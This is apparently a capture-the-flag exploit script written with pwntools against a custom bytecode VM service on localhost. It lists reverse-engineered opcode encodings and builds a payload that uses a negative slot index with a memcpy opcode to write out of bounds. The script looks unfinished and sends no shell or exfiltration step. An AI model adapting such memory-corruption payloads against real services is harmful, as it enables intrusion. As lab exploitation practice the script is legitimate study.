from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

sh = remote('127.0.0.1', 1337)

#0x555555555D4C   vm_handle_client->call vm_init_context
#0x555555555CA5   vm_run
#0x555555555974   vm_step
#0x5555555559cd   jmp rax
#0x5555555554DE   vm_fetch_opcode
#0x5555555557b5   vm_memcpy_slot_or_reg
#0x555555555914   vm_memcpy_slot_or_reg->call memcpy


#0x555555557020 unk_3020
#x/80wx 0x7ffffffec8f0 vm_ctx


#01   0x5555555559E0  "\x01\x00"+"AAAA" = MOV r0, 0x41414141
#02   0x555555555A27  "\x02\x00\x01" = ADD r0, r1
#0B   0x555555555A9C  "\x0b\x00"+p32(0x100) = MOV r0, [vm_mem + 0x100]
#0C   0x555555555B02  "\x0c"+p32(0x100)+"\x00" = MOV [vm_mem + 0x100], r0
#20   0x555555555B68  "\x20\x00"+"AAAABBBB" = MOV s0.idx_a, 0x41414141;MOV s0.idx_b, 0x42424242
#21   0x555555555BB0  "\x21\x00\x01" = POP r1, [vm_mem + s0.idx_a] || POP r1, [vm_mem + s0.idx_b]
#22   0x555555555C0C  "\x22\x01\x03" = LINK s1, s3
#23   0x555555555C42  "\x23\x01\x00"+p32(0x4) = if(\x01) memcpy(vm_mem+s0.idx_a, vm_mem+0x4, 0x100) and if (LINK s0 s2) memcpy(vm_mem+s2.idx_a, vm_mem+0x4, 0x100)

#ff=exit()
#others=nop


payload =  ""

#payload += "\x01\x00"+"AAAA"
#payload += "\x0c"+p32(0x100)+"\x00" #0x7ffffffeca50 -> 0x41414141
#payload += "\x01\x00"+"BBBB"
#payload += "\x0c"+p32(0x104)+"\x00"
#payload += "\x20\x00"+ p32(0x100) + p32(0x104)
#payload += "\x21\x00\x01"

payload += "\x01\x00"+"AAAA"
payload += "\x0c"+p32(0x100)+"\x00"
payload += "\x0c"+p32(0x100+0x4)+"\x00"
payload += "\x01\x00"+"BBBB"
payload += "\x0c"+p32(0x100+0x4*2)+"\x00"
payload += "\x0c"+p32(0x100+0x4*3)+"\x00"
payload += "\x01\x00"+"CCCC"
payload += "\x0c"+p32(0x100+0x4*4)+"\x00"
payload += "\x0c"+p32(0x100+0x4*5)+"\x00"
payload += "\x20\x00"+p32(0x104)+p32(0x200)
payload += "\x20\x02"+p32(0xfffffef8)+p32(0x200)
payload += "\x22\x00\x02"
payload += "\x23\x01\x00"+p32(0x100)

sh.send(payload)
sh.close()
